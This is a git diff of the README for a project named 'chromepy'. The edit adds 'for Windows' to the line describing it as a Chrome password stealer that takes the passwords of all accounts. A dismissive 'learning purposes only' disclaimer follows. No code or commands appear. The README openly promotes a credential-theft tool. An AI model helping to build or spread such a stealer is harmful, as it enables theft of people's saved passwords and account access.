@@ -1,5 +1,5 @@
 # chromepy
-Chrome passwords stealer (will steal passwords of all accounts:) )
+Chrome passwords stealer for Windows (will steal passwords of all accounts:) )
 
 # DISCLAIMER
 For learning purposes only. The author do not reponsible for your stupid moves.
